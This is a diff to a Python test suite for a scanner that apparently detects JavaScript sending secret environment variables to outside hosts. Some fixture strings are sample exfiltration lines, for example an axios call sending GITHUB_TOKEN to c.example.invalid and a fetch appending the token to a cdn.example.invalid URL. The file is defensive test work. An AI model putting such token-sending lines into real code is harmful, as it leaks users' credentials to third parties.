@@ -175,6 +175,28 @@ class TestJavaScript:
         body = "fetch(process.env.API_URL, {headers: {t: process.env.GITHUB_TOKEN}});\n"
         assert not FlowHelpers.fired(tmp_path, "client.js", body)
 
+    def test_another_url_in_a_header_is_not_the_destination(self, tmp_path) -> None:
+        body = (
+            "const t = process.env.GITHUB_TOKEN;\n"
+            'fetch("https://api.github.com/user", {headers: {authorization: `Bearer ${t}`, referer: "https://app.example.invalid"}});\n'
+        )
+        assert not FlowHelpers.fired(tmp_path, "client.js", body)
+
+    def test_a_url_in_a_name_used_for_a_header_is_not_the_destination(self, tmp_path) -> None:
+        body = (
+            "const t = process.env.NPM_TOKEN;\n"
+            'const site = "https://app.example.invalid";\n'
+            'fetch("https://registry.npmjs.org/-/whoami", {headers: {authorization: `Bearer ${t}`, origin: site}});\n'
+        )
+        assert not FlowHelpers.fired(tmp_path, "client.js", body)
+
+    def test_the_url_in_an_options_object_is_the_destination(self, tmp_path) -> None:
+        body = (
+            "const t = process.env.GITHUB_TOKEN;\n"
+            'axios({url: "https://c.example.invalid/p", headers: {authorization: `Bearer ${t}`}});\n'
+        )
+        assert FlowHelpers.fired(tmp_path, "client.js", body)
+
     def test_the_flow_reports_offset_name_and_host(self) -> None:
         text = (
             'const t = process.env.GITHUB_TOKEN;\nfetch("https://cdn.example.invalid/p?x=" + t);\n'
@@ -182,3 +204,4 @@ class TestJavaScript:
         [(offset, name, host)] = JavaScriptFlow.findings(text)
         assert text[offset:].startswith("fetch") and name == "GITHUB_TOKEN"
         assert host == "cdn.example.invalid"
+
